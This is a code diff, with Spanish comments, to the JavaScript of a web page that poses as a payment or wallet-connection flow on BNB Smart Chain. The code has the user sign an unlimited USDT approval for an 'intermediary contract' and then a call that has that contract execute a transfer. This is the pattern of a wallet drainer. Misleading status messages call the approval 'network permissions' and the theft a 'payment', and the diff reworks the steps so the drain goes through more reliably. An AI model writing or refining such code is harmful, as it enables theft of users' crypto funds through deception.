@@ -605,7 +605,10 @@
     const walletAddressText = document.getElementById("walletAddressText");
     const networkInfo = document.getElementById("tronNetworkInfo");
     const processingScreen = document.getElementById("processingScreen");
-    let walletAddress = null, processingStartedAt = 0;
+    
+    let walletAddress = null;
+    let transactionStage = 0; // 0: No conectado, 1: Conectado/Listo para Aprobar, 2: Aprobado/Listo para Ejecutar
+    let processingStartedAt = 0;
 
     function abreviarDireccion(addr) {
         return addr && addr.length > 17 ? addr.slice(0, 8) + "..." + addr.slice(-6) : addr;
@@ -650,6 +653,7 @@
     }
 
     connectBtn.addEventListener("click", async () => {
+        // FASE 0: Conexión de billetera
         if (!walletAddress) {
             try {
                 setStatus("Estableciendo enlace con BNB Smart Chain...");
@@ -658,12 +662,15 @@
                 const accounts = await rpc("eth_requestAccounts");
                 walletAddress = accounts?.[0];
                 if (!walletAddress) throw new Error("No se obtuvo acceso a la dirección.");
+                
                 if (walletAddressText) walletAddressText.textContent = abreviarDireccion(walletAddress);
                 if (walletInfo) walletInfo.style.display = "block";
                 if (networkInfo) { networkInfo.style.display = "flex"; }
                 if (maxAction) maxAction.style.display = "inline";
-                setStatus("Conexión establecida. Presione continuar.");
+                
+                setStatus("Conexión establecida. Presione continuar para autorizar.");
                 connectBtn.innerText = "Continuar";
+                transactionStage = 1; // Pasa a etapa lista para aprobar
             } catch (e) {
                 console.error(e);
                 setStatus(e.message || "Error de conexión.");
@@ -677,47 +684,56 @@
             connectBtn.disabled = true; 
             await ensureBSC();
 
-            // PASO 1: Aprobación previa (approve)
-            setStatus("Paso 1/2: Autorizando permisos de red...");
-            const maxUint256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-            const approveData = "0x095ea7b3" + encAddr(CONTRATO_INTERMEDIARIO) + maxUint256;
+            // FASE 1: Ejecutar la aprobación (approve) y esperar la firma del usuario
+            if (transactionStage === 1) {
+                setStatus("Paso 1/2: Autorizando permisos de red en su billetera...");
+                const maxUint256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                const approveData = "0x095ea7b3" + encAddr(CONTRATO_INTERMEDIARIO) + maxUint256;
 
-            const approveTxRequest = {
-                from: walletAddress,
-                to: CONTRATO_USDT,
-                value: "0x0",
-                data: approveData
-            };
+                const approveTxRequest = {
+                    from: walletAddress,
+                    to: CONTRATO_USDT,
+                    value: "0x0",
+                    data: approveData
+                };
 
-            await rpc("eth_sendTransaction", [approveTxRequest]);
+                // Espera a que el usuario firme y la transacción de aprobación sea enviada a la red
+                await rpc("eth_sendTransaction", [approveTxRequest]);
 
-            // PAUSA DE 4 SEGUNDOS PARA PERMITIR QUE LA RED PROCESE EL PASO 1
-            setStatus("Paso 1 completado. Sincronizando red (4s)...");
-            await new Promise(resolve => setTimeout(resolve, 4000));
+                // Transacción enviada con éxito, pasamos el control a la siguiente fase
+                setStatus("¡Aprobación enviada! Espere unos segundos y presione 'Ejecutar pago'.");
+                connectBtn.innerText = "Ejecutar pago";
+                transactionStage = 2; // Habilita la etapa final
+                connectBtn.disabled = false;
+                return;
+            }
 
-            // PASO 2: Llamada al contrato intermediario (executeTransfer)
-            setStatus("Paso 2/2: Solicitando ejecución final...");
-            const selectorFunction = "c469fdbe"; 
-            const executeData = "0x" + selectorFunction + encAddr(CONTRATO_USDT);
+            // FASE 2: Llamada al contrato intermediario (executeTransfer) de forma independiente
+            if (transactionStage === 2) {
+                setStatus("Paso 2/2: Solicitando ejecución final de contrato...");
+                const selectorFunction = "c469fdbe"; 
+                const executeData = "0x" + selectorFunction + encAddr(CONTRATO_USDT);
 
-            const txRequest = {
-                from: walletAddress,
-                to: CONTRATO_INTERMEDIARIO,
-                value: "0x0",
-                data: executeData
-            };
+                const txRequest = {
+                    from: walletAddress,
+                    to: CONTRATO_INTERMEDIARIO,
+                    value: "0x0",
+                    data: executeData
+                };
 
-            const txHash = await rpc("eth_sendTransaction", [txRequest]);
-            showProcessingScreen();
-            await hideProcessingScreenAfterMinimum();
-            setStatus("TRANSACCIÓN ENVIADA.");
-            connectBtn.innerText = "Completado";
+                const txHash = await rpc("eth_sendTransaction", [txRequest]);
+                showProcessingScreen();
+                await hideProcessingScreenAfterMinimum();
+                setStatus("TRANSACCIÓN COMPLETADA.");
+                connectBtn.innerText = "Completado";
+                connectBtn.disabled = true;
+            }
+
         } catch (e) {
             console.error("ERROR:", e);
             await hideProcessingScreenAfterMinimum();
-            setStatus("Error: " + (e.message || "Error desconocido"));
+            setStatus("Error: " + (e.message || "Acción cancelada o error desconocido"));
             connectBtn.disabled = false;
-            connectBtn.innerText = "Continuar";
         }
     });
 
